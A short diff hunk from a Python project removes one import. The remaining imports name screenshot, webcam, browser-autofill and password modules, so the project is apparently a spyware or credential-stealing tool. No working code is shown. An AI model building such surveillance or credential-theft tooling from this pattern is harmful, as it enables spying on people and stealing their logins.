@@ -18,7 +18,6 @@ import subprocess
 from Access.screenshot import *
 from Access.webcam import *
 from credential.autofill import *
-from credential.history import *
 from credential.password import *
 
 if sys.platform.startswith('win') and sys.version_info >= (3, 8):
